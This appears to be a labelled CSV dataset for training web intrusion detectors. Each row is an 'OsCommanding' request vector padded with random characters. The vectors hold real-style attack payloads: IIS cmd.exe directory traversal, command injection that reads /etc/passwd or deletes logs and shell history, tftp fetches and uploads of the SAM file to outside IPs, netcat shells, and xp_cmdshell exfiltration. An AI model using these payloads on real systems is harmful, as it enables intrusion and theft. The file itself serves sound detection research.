id,class,vector
8502,OsCommanding,/A024sUrn9Xupdatea/uTsa3t6wtrggo/daaiI/sejhlynseeai0nRegun/hDesystemKu/6rAvFnON6S6VCHJqoPxd/samhyaP-UbrscriptbinY/O4L/4OidSotallsa4o/eeTxur5o.nsf?dthspOheOtOd=aqOjA&d2pca19=73&zFvarCHEacceptCobject=eraye&sjeE5zv5tA=mn&L-phpAPnL8=eJ7iEEUGRf.&resro7ttih=opr+alTfrr8nqHperlE-teT&rFeHdeu=07&mjnaq=48552619
8507,OsCommanding,/27TlLAdtwcpXYDr/ganarcrbgffi/iVXSIS_0FM6BLDc/ZMN3jK911TbaV/TNTvDN34/c-.8aBSSnsMH/68oufduxrhedidxnmen/4DAduzxAz8yH@g/hos1u5OoVvV4/zLQ9/ro.png?3n6iaosan0czlo4=ussvduyk&JkYeBJ-K6Q=2ee%3Btesvene4r&ptldoh=8&ebsr0occhmerh=%7C+++++cat+++%2Fetc%2Fpasswd+++++%7C&oeteoxeeszohreF=fetfcmd&wrnkroaGbeniy=7622&hd=86&Aft=mailiwe%29&YrABuuZsock_streamWo=%3Ert
8510,OsCommanding,/aitt3odw45d/toRkan3suTfut1btatco/e8Ki4ugSC/i6LhS/Z7/ubr/etecihiirtsrbj7frro/@h@/o6avideSoeeciN/qceceaiicctortcnao4c/iimubd4oiuejnlhhdsg/e28NzZt2T5f4JJMS.css?aooudipao2aeI2=751&RvWwwhereN-VXC4=t+%3Acmdzmaphnmn%7Eh&yei7ielAubbh=kqedeHrhcOtmott&dY=%250arm++-f++%2Fvar%2Flog%2Fhttpd%2Faccess_log++%3B&btWitwgijzgoce=c6miXYA&chl7ds5nNii=18684613&orbrhnr0ngepv=6lfreqoheirro&etsrgAdnt=8Zz6Nxy&Z77.nF=036337812&Akti7tns4atMIua=09026695&uS=h5syora&a9odSsok=htpassmu1%3Ct
8528,OsCommanding,/dW-nM9dyVhxdYopv4q/elrbfAnptvsaqzlnleja/n_WlBcW./7lhdhiq/vZi6uJAbiframe3yk/1Jq_J_KtzQ7Mu/7kb36bJgTdh/eaoDSb6olGfgXGy/1UflQ_/kdkw2Zt_nP@Ysb/rN.shtml?iethi=odfai&svWl=4646983&RQfkNQ0wXHE=vhhtgtez&ne=ogryZnne9omxChoEds&6ob=i+r&ck1Mheh=%5C%3B+++%5C%2Fbin%5C%2Fid+%3B&EgufAHdKpv=ktpEE6auslser&tst=si8awmerf&ltaxrc=eHd.ygjr6&bsuoWtiydeaI=64&NtesfaareqesaKe=nYxYf3X&rf=nliz-so%29e8e%3B&nstSmwp-TwMEjm=378&dtnftprE30lP=jCx&nI87rRagaA=d%3Eiudeewgetp1
8530,OsCommanding,/d3aZJ2jqIJgngg7Ce2d/osnoaeeecou/aoes/1fHzBmPV/zmeuW6amJK/szKfa/WshH2KJaccess_logj4/n162hldEircTneuenwu.swf?nG7TidrnHe2t=lEixa573aI1cPm&ooctThnhsh9lwoe=%40fveftwr&6rdhanm=md90ddeleteferno&2EFMJiLj7HWn=1uearcn%3Eo&Stsac=%7C++shell%28+%22cmd++%2Fc++c%3AInetpubwwwrootMSISSnc.exe++-l++++-p++0464++-t+-e+++++cmd.exe+++%22+++++%29+%7C+++%27&aTi1goehlsesd=36845&wn7ft=j%3EnsNsue+cm%25twrt+&a3nt3atjbnsvsh=06&Aihtelzdtr=s1qexeceOysqausozf&apTuernULsu=%2Brtwh&ht=41932&i7w=ob&Rzitskoe7f4=74&sLatr5E=epyiaexect%24a
8557,OsCommanding,"/scripts/file.bat"""
8579,OsCommanding,/wtE/d-emMQdEFIiVGDCK/u1edooaanhes/aen0.asmx?e9ersscelsnEcU=qraa&ntztainh6=sh6dneicE&zht3plotaebaEn=503481427&oDf7h=agerot00ruaou&utEra=jdenrvh2mSzgdy&Euen=n%27&Ear3usg5StSa=3678&eeIr8injeneoed=+++++%3B++echo+++++%3B++++w+++++++%3B++++uname++++-a++++++%3B+id&a50hZ9ec6uveibd=8
8604,OsCommanding,/scripts/..%5c../winnt/system32/cmd.exe?/c+tftp%20-i%2062.107.47.226%20GET%20cool.dll%20c:\httpodbc.dll
8607,OsCommanding,/itqtO8ASrdJ18/%um80@PwLHHTDzla/mofipessse/rSR.w/sd2CrF4SsS5ZfFC-Twp/czlkelh7l1a/sGF0GLT/gehh3L@x/ignIfiht4a/vJEsKyF1.js?deEsTnitl0ispn=%7C+++dir++++..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C++++%2C&deile1oWd=1373
8622,OsCommanding,/iisadmpwd/..��..��..��..��..��../winnt/system32/cmd.exe?/c+
8625,OsCommanding,/nthttrnaxA40tt3/mti/JmrrsmyeiEtenoiE/9V7k/tbtiao2leyleAtrgaoi.nsf?iIs8me=a6ibllseoao&ksgjtSe=eu&3Dpln=m-4GU&5efPbh9=5a1rR&egsoOr=+z&eelzixegnhnah=a%24&slaiS=275&Eu=tidHagb&epjH=yl4dUuTl&tysnAtrdn=%27++%3Buftp+-g++%2Fhome%2Fvesiniales%2Fnaleontiasel++145.139.254.182++++%2Ftror++++%3B&axyeaieees=38616697&4os24=f2Nsbq
8642,OsCommanding,..%%35c../..%%35c../..%35c../..%35c../winnt/system32/cmd.exe?
8647,OsCommanding,/aan0opptmz/en9as0oYeseye/M4aL1rmIPa.wPL/tdlioytmlt5RIea/bjwfrIvSKi4RHGRZBV/8dbSf/ngTyJadogy/er/afoh7nesoo/e0R37divizDrU2homeP6/aHCrgqGE.l/yx5nDFqS5gva6koAN84.dll?5ctyooqbaudx3=slZ&Pelib3updateb=E&5ee=pig.5fDp1Odz&iIHseemsid=%3C%21--+++%23exec+++cmd%3D%22c%3A%5Cprogra%7E1%5CtIn%5Cfoeeeso4rh%5C8ee8kghd.exe+++++d%3A%5CroEthd%5Cwww.etiese.org%5Cwoa%5Cdatabase.mdb+++%2Fx++++exporttofoxpro%22--%3E&ed6nt=Eiauodocument0&.dDu_eMbLf=ekob&hs=xefer6ew0ndaavja
8648,OsCommanding,aewr=rm  -f    /tmp/pA  |&nisnd=tsoo8et
8652,OsCommanding,o4wc2aramrhz9n='     ;uftp   -g     /home/enorgeesve/innase    154.239.244.117  /geat  ;
8654,OsCommanding,/zehOp9_5/uo/o1ovQtyghdIZizXUa/etearmc/rCAEe0tInrlae0feus/dsSkYkScd7V/jmt01ibg7eThouohsc/FOu-ccatq/pnAE6liamsEEtIgSotcu/fxgS2UE0mWLWGO.cfm?QCnaIAhNU=iwo&4acceptC434=deoa&zeaoaseyulso6=enzdbAa8+t5cc&ctfaxe=%27+++++%3Brm+%7E%2F.bash_history+%3B&iOreorjaiht=between%3B&eser=3&okon=hvesn2i6f&sqaaaO=mCCJ-G3ABQB
8655,OsCommanding,/anjdle2arhbeow/fks/r6puEBuT/dteanensmmd/dii@qE9J/5eneeuRn2tba/vfdnoptg8ndhuVr151.asmx?kb=21087&a7gBsruZsa=yseossi70aarsie&bgsoundwhere7YT2j5perl8=26454&9aaprlHg=8018&opG00k9@nT=irao&..cswQ=224&nn=%7C+++++dir++..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C+++++%2C&bgsoundphREnH7YFU=0885&vNevalF6e=ostBss+&yyuatong=seopdsasets9&t9ypPr9Ehst=s&PtXUX@7FVSexec=00020007&0AonfnshL1=uOhBxobcP&ejsae4rlvK=sTEIdsi4yamti+
8659,OsCommanding,/ianeoaia/xterm3nYUb/xnutoUea/between_T/f13MP@528Td_C@C.png?wHWW9GM3H=sv%3Aim5&Peotysexbsm=b9N&htbohtL=+xp_&eqo=00959486&ctcrlbeogea=23&MtRlTwrnH=%5Cnls+%2Froot%2F&v5beeerx0H=2831515&shutdownFformyreplacePK6dropIJo=1145874&iit=tcr+IheSilink%24cps%3B&rn=ouo
8668,OsCommanding,/saCtsxNhhdnsl/Turm0reddfao/nnPg1fBGY5x55/0_dqfCIifc4_vHV/sh6gcNzcxG11m/ih1hun6eobfaseu5he/7ronopt/26ICiyw1/iWQ/tedilinsgtivwiroct.jpeg?24qG@CC8DTR5=%3Ba+e&dlfiapu8s=r&wte6A=t8mh2n&sonNTou=%5C%3B+%5C%2Fbin%5C%2Fid+++%3B
8670,OsCommanding,/eT/gJ0lQA/zi2fAT/0utswos/aupGIR3E4Se/rDzb@a84..jpeg?utiQeri9=rxisttsiu7jtUi&nirtoEef23Cwea=aLr%3Bei%3Dlink%3Emservicesdrpl&eaFuht=14210291&_Q-DSformv8=bgnogsoowig&e2tc=tealib&whsed0p=vN1AqvPIE&zoonpeia3lis=r&em=tth%3Caee&bBreplace9nph-sBHP2form=hcvaendad%7Ew
8672,OsCommanding,/file.bat/..��..��..��winnt/system32/cmd.exe/c
8673,OsCommanding,a1usE6yv2owt=s1tk3ge&rnrrnonrh=r1ns
8679,OsCommanding,/msadc/..%5c../..%5c../..%5c/..�
8688,OsCommanding,5rwe1daptuo3n=hOttU&_YlocationbA4pYr=wp- &a3pn2bbs1terpec=Enn &8eini07=5612105&esciaoea=7tr&qGi82e7=94544999&1esiattanqnb3=MqWcatgftr
8691,OsCommanding,6ocaiy6d=sIoJr&kdoenz5ni6u=h=6m &tfa4=linkENco&3n5ireaouokejdr=eb&xmuNaan8m='    ;uftp  -g     /home/ortolatrgete/tans 47.78.4.112   /icns     ;&psd=eadmin&Z3IvJ=hdr
8695,OsCommanding,/s5zojrdH8otx/ooLkirj5er/ZSs/pqN-XsFaYO/Hnull8vsl/b-vyEOwFFHnTqhC/x875jCPtTHhwh/eOT/eaaeHadt2P2aun.jpeg?inFcoinputAZ2og=03569858&RIs3WDBK5=sfcgkiiMassa&iaeaeaeoMse=rp2ZAbQ2v&jyJrcpWF0Y@Dv=nes%3Dxiq&ndocumentlocationY.STLM@=tftp+++-c++get++++55.198.165.149%3A%2Fiegeorer%2Fmeilol.exe++++%7C&gWol5n4o=31097912&iuo0do0uRpr=%3Cm%3Fte&ttjd=658136
8717,OsCommanding,/bacynetcatI5/mUallZewgetfnetcatSV9/e23FN5xAUDPK/h1awdayomth.msf?wlkfBtGE=zV6.ktl&tevns409poj4t6f=tdag&7Tp_G2n5jD=uoq3no5mochac&elmgeqnt=mDLAod.&onhfizoukme=213.245.119.30%7C+++++tftp+-i+++216.217.23.80+PUT+sam._&shH1=ny.5XopqpgJ&ddrlnejp=415584407&e7ot7em1Oheywe=+h&mkteNsuon26gohd=e&PRrzn=w
8729,OsCommanding,/Dnx8IdFFz_IhtG/hrti/nK7vXcv77akLwI.pq/eekOTNqL6pAY8Cs/tOxdgoKM/eaoauOpaWae1ohactjve/io.GkN/k9zaseI1DnOoUo/vK8xJ.3R/arr/td9dq9kW4.png?oeh4jtuoGiy=mZwlYHkl7-&mialos=lmochah8uer%40+e&ntuannn=echom1tNl&sTxltenretE=e%28d++&sricv=m%40Ecoescriptd%3B&t8eecsmtssdKn=ha.&LRPC=861460&dedhs1Ssnmrtz5c=168.227.76.249+%7C++echo+%22test%22+%3Eevilfile.txt&fp=9rtWainpfE&Pril5insh=setnr
8737,OsCommanding,/msadc/..���../..���../..���../winnt/system32/cmd.exe?/c+
8747,OsCommanding,/msadc/..���../..���../..���../winnt/system32/cmd.exe?/c+
8748,OsCommanding,/tpJpkVlk9DDICaANm/Wy6nph-fgl/yREVrO5@d1/caeTan4crxOlWE/t6tk9-wo/U8widS.aspx?dtnng=pEsw&tyoExc=%250a+++cat++%250a++++%2Fetc%2Fpasswd+++++%250a
8754,OsCommanding,..��...��..��..��..��../winnt/system32/cmd.exe?/c+dir
8761,OsCommanding,/scripts/..%5c../winnt/system32/cmd.exe?/c+tftp%20-i%2062.107.47.226%20GET%20cool.dll%20d:\httpodbc.dll
8765,OsCommanding,..%%35%63../..%%35%63../..%%35%63../..%%35%63../winnt/system32/cmd.exe?/c+dir
8781,OsCommanding,/msadc/..���../..���../..���../winnt/system32/cmd.exe?/c+
8789,OsCommanding,/eb/eE.Bclrl/7fAjod8oht.png?co5=a5zl8u8zy&J1xp_l9t4%uYu.nph-=psyve&lAmc6Cylmlh=wr&ihmeAiflr=mail+++ipBesd%40tjddcOd.osxp.gov+++%3C%3C+++%2Ftmp%2Fwu.c%3B&Ital01Alueabo=et8i7awlkis
8794,OsCommanding,/7position3/7epdioaham/pwWalOKIvQ/nfssno/hpgK2.a/tVs7lIrnIZiur8map/qf.mdb?o6az3=aEP9jAmzsoN&tAnjvtsa3=eeacgtoilcmdz&Gbody4.Y2=i2f&tobe8r1=sYc&Q1O-hH2=tDML_vVzo&ahrfna=77944&reemd=tE&sffspktIi2xg=15269974&epsthhc=+++++%3B+++echo+++++%3Bw+%3B+++uname+++++-a++%3B+id&iapnou=psiheilblsectul&PbNdmafufioy=9ed%2B24openpasswdA-n0d
8806,OsCommanding,"/scripts/file.bat"""
8823,OsCommanding,/bin/itsrooa.pl/seite=;cat
8824,OsCommanding,..%5c../..%5c../..%5c../winnt/system32/cmd.exe?/c+dir
8848,OsCommanding,/scripts/georgi.asp/..��..��..��file.ext?
8849,OsCommanding,..%%35c../..%%35c../..%35c../..%35c../winnt/system32/cmd.exe?
8852,OsCommanding,/ryiuKtxotqIvpjW8N.css?tNaeBTgfHcutma=oafnnm4ftp9v&fnninnp=onhtre&yLqsTM=%7C+++++%2Fusr%2Fopenwin%2Fbin%2Fxterm%2B-display%2B160.85.84.230%3A0%2500&docHhansdiooeje=shom7+rndanpti&caOle8haSanLs=%3DebSe%3CuUignes&Motlevohmdu=ldmpositionwece%28iexif%5C
8856,OsCommanding,/ajexfz8hms.exe?ekIumeqoftsET=200.235.1.113++%7C++tftp++-i+++++36.110.218.221+++++PUT+sam._
8866,OsCommanding,/w.8vk.Zty@UzS/asti3/ef0l.asp?gqwhtacces=%2Fperl++%2Ftmp%2Fan.pl+++++-p2668&jtnnt=dnull&autoexec8BT7q=t0oe&pdAH8Y=%3A+in4+Rers%3A
8871,OsCommanding,/kL1i/iwUPHy/dU_621it/orSiaiodier7/WnodeZOWX3yo1.shtml?8N6s9=tmu
8874,OsCommanding,/iisadmpwd/..��..��..��..��..��../winnt/system32/cmd.exe?/c+
8888,OsCommanding,/-HuBXepXQRl1M/UIErWrra4emes/okt3m2DENacrlxssyi2P/I1yiriyrnvts/tY9_zJPLI7@PxNd/o23xqremffyHW7RxK/nCd7C/EhNrexeczgq48/Ued/oh/at1s83n3iizosye.cfm?E7see=hsltsivpcFnf&ofaaoeg8htT=32&c9ekiIsiExmlKZ=%27++%3B++cat+%2Ftmp%2Fres++++mail+ngtoroel%40ri.com++%3B&uhthtlmjUse=eaOlt&toyzpaeOlGIdh=o7j1qmFi7t&mitio3uHus=tahneihuroacsg8og&copynetcatkPajcatDVconnectYX=lpp&iFlra2Z=0175670&bdmRzmeoi=62+biciyciz%5Dr%5Dlsitno&rmBI8KScmdCZcmd=1zA8CJ9OcIBh
8907,OsCommanding,"efa3a9dihI0aia=8441551419&ie=aro6srtlvarfhavinga8t&cymi=aOcio&rtsylonpGsppo9X=xcxeeA1tlom&8rrsrosMezh=n5o&edlaRttr=neae&scriptlxF=mZcx4&eohrt=3452662800&tp=seZmFu3fv&hqenwaaheEea=exec xp_cmdshell     'bcp  ""select  *     from oed""    queryout pwdump.exe -c   -Craw   -Shackersip   -Usa -Ph8ck3r'&Q-2Dboot.iniIj=Aosehk-p&&so=h~&lsfl=tt"
8918,OsCommanding,..�
8921,OsCommanding,/yLn7a.teuHg.23XD/hk2w/ds9co9PG.php3?sBietSSs=c_gRMZ9&1tbXc6logH=dCEeo&Exeqm=7203&ildsaolpeacuh=wOinZwheree%3D8ar&ii8bua8ohLhfre=+%3B+++++echo+++++%3B+w+++++%3Buname+++++-a++%3Bid&eetlhsi=ihdul9cer&a8w5fin=nbb&-ibodyGjiin=0187721&neo=5614163543&reekrokbsa=gJxT7&cKwCh=oe%27sformaeote&cegyoted6sch=hhLfaIXyhKfY
8923,OsCommanding,/1i37G7gETc_/VhYpY0DZE0-5/fdLzVJqTdia_jWOJ/7@WvJukh/so3ut31gtpbnaD/68Imqayt2/aWE6_.24/iRaxXqLI8Vf2z43ORrH/awden4u/n7A_Uy3bTNiI8Tnm/ajlbnxtdaee/Ilib.htm?yd2xer=%7C++cat+..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd+++%7C&tema0=y56&ndqh5=02222
8930,OsCommanding,/iiqfJLBCPanU-yqd9R/hyannfIOa3s/iqy.msf?eedirnfnbctWeo=iavfj-ItKF&ssi3ntneuan2i=5851609&Pguhtl=188.98.40.133%7C++tftp++++-i+++++131.73.24.129++++PUT+sam._&elcbs9ldka8=5290
8938,OsCommanding,/iisadmpwd/..��..��..��..��..��../winnt/system32/cmd.exe?/c+
8951,OsCommanding,..��../winnt/system32/cmd.exe?/c+dir
8960,OsCommanding,/K2%u/mt7lidenG/eo/4SAtyK/n92Xdk6.sampasswdUUT/yr/7auo1erelnaoieih/QCYzdevalxMrFK/thQH.epNhkpcDZA7v_K/ej52z@YuaBQGayoOnR/RbgAMBEsa1P.gif?copyB7replace=duvZMb&srlst=nJDNgQ668.W2&VSihMe=a%28eti-rrh&kEoa3e=qo%40&a1EIiqnzOnto=psamqscuhx8xtm&tsstahnhspt=s%3Do%3DwPn%5CeiIlnph-tSdelete%28&moeeawpPcdimsOA=c+c&2M81aetizro9ln=rirmHOnDiero&RthLltuSnoss=2KknCA4C&drbdn554T=t2fii&yr=7599&2iffromZWG6pr=674&tmgliula=%7C++dir++..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C%2C&oL6tQ1W=35
8962,OsCommanding,/scripts/..�/../winnt/system32/cmd.exe?/c+dir
8963,OsCommanding,/updateMa/geCLOtiHaT/dabtylntensaNrdie/FK/eU_ywvgsZg@feLYAjdF/P1autoexec0mLhQi/mh7cgL_/yj6S/3p9@TxZ4d2p/updatebthconnectIautoexec1KZGw8@.gif?oyoefse=0sn&ahrsrkcdts=293&ethiwaukl=AhmtG4rtdekmeta29&wmE-b=++++%3B++++echo+++++++++%3B++w++++%3B++++uname++-a++++%3B++++id&ebandAf5=j+n+
8974,OsCommanding,/n4pY7@X6ePE-wuR.x/Oaprynnce3aetoxencq8/kVg8tNCpJ2s4qv2sZA01/ePg5HXS1TuBb7z_OYdH/tsB/bVD/8fioamsadbhptttscnr/8u8/cv/a5ersmtbo1s5mo/cwS9-u7kcigku/gA.css?1dr6fggde8seb=%27+++++%3Bcat++%2Ftmp%2Fres++mail++le%40ar.com++++%3B
8978,OsCommanding,/iisadmpwd/..��..��..��..��..��../winnt/system32/cmd.exe?/c+
8982,OsCommanding,/msadc/..%5c../..%5c../..%5c/..�
8986,OsCommanding,/tK8A_jg83/ZechopsCB_E.s2fsystem/te.N_kuRD2GS/lmyp6TMX/@zuktLHC/e8FYy07u.CB39suBk_.exe?92wet7d49yo=%29cd&nrreoe9taii=rhshutdownlteSft%401%27a&xa7e14tostksroi=sCZvzr&anAe4xseia=abetweennn&oitqk5oajtb=andw&pp@nDNando@OwF=nsyesletetAse&Mxd4cgRgita7=tshebyemyJ&hodELeMaz=+ucqrnaobYMA&qkeste=148768&bwUmS0P0-J=28634&hneieesheeseSo=6he3et&Daosnlil=TTmselect&tosj=h%28jew+s1ftduselectimg%29&iooimRuienrawh=7194121&pls4m28=+%3B+echo++++%3Bw+++%3B+uname++-a+++%3B++++id
9029,OsCommanding,feL7oihy2i3nas=ree&et=6El
9030,OsCommanding,/_vti_bin/..%5c../..%5c../..%5c../winnt/system32/cmd.exe?/c+dir
9033,OsCommanding,/scripts/..%c0%qf../winnt/system32/cmd.exe?/c+
9044,OsCommanding,/scripts/..%5c../winnt/system32/cmd.exe?/c+tftp%20-i%2062.107.47.226%20GET%20cool.dll%20c:\httpodbc.dll
9046,OsCommanding,enNre4ftoS=65&uudsi9x=SahcstwErn&pAfu8mn4st=7777367925&Oss2b7eSar=%0a  nc    www.litise.com 80  ;&4ateoaiE4ae0fi=lAMzRYo&rsixE=ngatb0rftnctene8&iirUef9hnsbopr= &KaFkWgtQxQ0=N&eiRrcrBiP@I3=843353&yZ1serviceshicAYv=as6hzswsalionws
9049,OsCommanding,@tr@=tfPznvq&ahxU4o=l@zu&ivlfngtrme1r8te=9&.R9kv=nsqKjG6Z2sxL&itDnoh20eMl6aet=neeriaer1mNoo7t&CxdMV=h7eusdseak
9059,OsCommanding,/file.bat/..��..��..��winnt/system32/cmd.exe/c
9061,OsCommanding,/_mem_bin/..%5c../..%5c../..%5c../winnt/system32/cmd.exe?/c+dir
9062,OsCommanding,/ssi/envout.bat?|dir%20..............1
9064,OsCommanding,/anu/ilanliooti9jdduoujE/w3nu0orsssool3s/gIformdBpassthrusK6KxF/hat/tRdd0ciOe29azotl9r3/g4hlib02wF4.qhavingEcY/4b2/d3OZ.l/Ekedvamvo/R6gU9./in.asp?8Afonshiet52wde=having%28n&sso7enndn=lnN&wVg03Xq3C@=tits&enle6ii=l-&5nno2s0ift0i=oxox&eatviufy7iOohI=%5Cnls+++%2Froot%2F&jrstHbeILi=ni&CG.Gwp-=do+l&I5hEbnftbsmt=e7dho
9065,OsCommanding,/TrnnhehcmMubW/3rhr/nH878Th.tiff?at=%5Cn++uftp+++++-p++++www.trma.com+%2Ftendan%2Fnsge%2Fse%2Fieve%2Fie%2Fstenti
9069,OsCommanding,"/scripts/file.bat"""
9072,OsCommanding,/ssi/envout.bat?|dir%20..............1
9079,OsCommanding,/.wPzmkvPNDkaf8K/btoi9raNp.nsf?tso9g=1374&oTuoSohdne=uuWsQg&ie=oUC&auefrxsA=9UiXlFM9&rgatrsa=exec+xp_regwrite+++++%27HKEY_LOCAL_MACHINE%27%2C%27SOFTWARE%5CMicrosoft%5CMSSQLServer%5CClient%5CConnectTo%27%2C%27A6oel%27%2C%27REG_SZ%27%2C%27DBMSSOCN%2Chackersip%2C80%27&r5sqntlFshheA=0480524
9080,OsCommanding,..%c1%pc...%c1%pc..%c1%pc..%c1%pc..%c1%pc../winnt/system32/cmd.exe?/c+dir
9084,OsCommanding,uUufdeoarr8=4478&tnlneLD=\n    uftp    -p www.tige.com   /ndniro/nsieitri/itla/as/ngdein/ta&sl=aEfOhhw1eo&R9abbiE6dlsee=do&ihe6=ise4ftpr&aas9ma4etl=uEmrtPeus&0ToncKE=bkof&le=9&nsSe=weseRemgttsi7ae&Wng5iormqht=zMUbvvY&s6ersycsnheale=n1vtX&saheyjHkbn=4932738046
9092,OsCommanding,/hD_oINgVKkG4AiDW/uepsewhethn/Cthlnoa/a.hhbT/iatt/BSsrEdwtlmqku/bNv4l/sft1l1xu/feOensamyeeotoeeu9Q/e-Wf2_nCDWtIw013PvO/rolHY/eleu3oiknu.gif?Eptsrn1xhiMe=kMrr4t2eeahtu7&gr=Os&rdet=aoe&ctir6e=ts6d+&oSadurxsoen9etm=8552680049&bet=r&eye8igisn2bedn=38711&Iboot.ini36Uanodeuboot.ini=05578&s2nsen=DxkhmU&gnti=stH_jf&et=4ozfrAA%3By&tIwi=xnodeconnect&wn.xiB=%7C+cat+++++%2Fetc%2Fpasswd+++%7C&vUJNformwgetp79=mVmi96t
9100,OsCommanding,/pg/t5-ol/cWLO@/7iframeZM/jlw2U/oUoJZ5338hdrTYbG5p8/1LUgfeutitoc/e_y7PM8MAdzj5z.jpeg?BvR1CstdinK6script=eda%2Feo&718-KQE=Oyal2q&o93gfbAettrclc=s3B3.1-wR&aa=3
9102,OsCommanding,/msadc/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/winnt/system32/cmd.exe?/c+dir
9106,OsCommanding,/wgenieeihii4mam4/e6.asmx?afctifu=td&fOqs=wcinttinahe&ihr=87105&ilroegddda=dr8UVO4ey&vtsddimtntlf=931&C1aoeYfmr=uhleg%7E%5Co5NS&sigFud=d5wp%40e.&P2ymailDV0=%5C%22+++%5C%3B++%5C%2Fusr%5C%2Fbin%5C%2Ftelnet+++++www.ortimadeat.com+++29347%5C%3B&uehs0ftpttyo=e%3BiUnsu08+f&i5nrawtli=82722586&1dEs=i9u%27ah+execphhonl&d2EsVv=xp_nh3bnEhTreNvariz&sir=%5Cdyey&pteocrYn=2468
9109,OsCommanding,"/scripts/file.bat"""
9112,OsCommanding,/3VtjWueP/j8IxahadrYixGusNdtl/ikPSujP2XEcAp8/sh/nw63iEE.b.asmx?httpsymSd0=7012030794&ssoDlreehy3=ikv4Fi0PL&euethioifhtrdZ=87&iNk=ddfjVxp-qdq&taonte3=%7Cecho++%22+++Content-Type%3A+text%2Fhtml%22+++++%3B++++echo++++%22%22++%3B+++id++++%5C0&ynncue=07848
9115,OsCommanding,/scripts/..%5c%5c../winnt/system32/cmd.exe?/c+dir
9119,OsCommanding,/msadc/..���../..���../..���../winnt/system32/cmd.exe?/c+
9120,OsCommanding,/PBServer/..��../..��../..��../winnt/system32/cmd.exe?/c+dir+c:0
9126,OsCommanding,/aiBSoN/o0r/ennuiPnssK1e6cn2ed/la.mCi1P1ZmD.JOy/leb7saziiexlpn0ntei7/s@EEYkJd.gfN6HcV.6/Lrtmeermo/rhbamndit/dE2itEabereItwsenmdw/uuse0mlde.shtml?Ntn=execro&lqhcseuh=1&3UMrZKz-G=d7VZQf&eocurSeS=a%7Ees&Riet=198.70.190.243++%7C++copy+c%3A%5Cwinnt%5Crepair%5Csam._+c%3A%5Cinetpub%5Cwwwroot%5Csam.ddd&e9bnTs4etsfieho=5586510&UrcOrtSkYael=%24t&ennobE8I=8001225&snegw=+qiZois+%3Cnt
9152,OsCommanding,/rfhhclhCuet/uWxm1yQ5Bm/qFDi/wXqcoY_0I/aae/gfinahIltzZeteiuEn0/tve/PtdW5nthCvDrraCahipa/t9V1f.shtml?qnrzb1tumesh2=080&un=71&6zotdmagmsteit=+sr5x7qeosam%40Atu%5B&oaos7uf=elAuH%40&bj=880&aa5z=%250a++++cat%250a++++%2Fetc%2Fpasswd+++%250a&ra3ciao6=aAMTHH-&ihtolzrpex8=%3AtYtis%29t&hpgeao=w.iGv&wtl=wrr&passthrunodeIrinsertgnmochaTDA=68496&qslrh=8461&hef2oh=9&utIiieDsIk=9np&S0ZvUfUi7=5621487
9163,OsCommanding,/Dvpzyyetca2catS9/nus1l/e6mDOQ61s-nXp/remftd/ryvhometyKcplinkZ_iaL/tteBIkf/esa/coIcbujA5NftpX/ED20a@PQDjTxEWU.php4?adnroDno00o=5e
9172,OsCommanding,..%%35c../winnt/system32/cmd.exe?
9206,OsCommanding,euc=uniont=hm0~?tivMns&C7wY_servicesJqrg=uld7h&2GaP=v&rkAf4e3z9rl=caugt&aleeoAsso=7824
9207,OsCommanding,..��../winnt/system32/cmd.exe?/c+dir
9210,OsCommanding,/IISADMPWD/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/winnt/system32/cmd.exe?/c+dir
9241,OsCommanding,/emtwams.shtml?6284SZ6PsF=31360648&NsystemdL8sin6sjY=%7C+++++ps++-auxwww+++%3B&6eh7eis=5c9&ersiiu1ISal=oKT4oToilo&aatutlhisdInalL=Mf+&79Cw_Gzq87Y=aliow&wo=536
9251,OsCommanding,/images/.%2e/.%2e/.%2e/.%2e/winnt/system32/cmd.exe?/c+dir
9266,OsCommanding,/608_N@s/0DoJxx3zbSE4k.jpg?4l=%7C+++++cat+++++%2Fetc%2Fpasswd&9bh1evals9Jml=rsi%40&a8soejnue=m%5Ctetiopenge&iehhtoann=hhz%5D&se=oce+%3CSvK&ssE2=+ovees5%7Ctxml&torwsm3c=e5EoutRaccess_logaehamthtw&9ri=foYscripty&segqygod8oFeht=363&molinns0on7gli=s.dPX-z&rel=lhuv3neln&sjiG.DZck=bnnrrngrg&cqqeyehAaeyl=pPS_ICwc
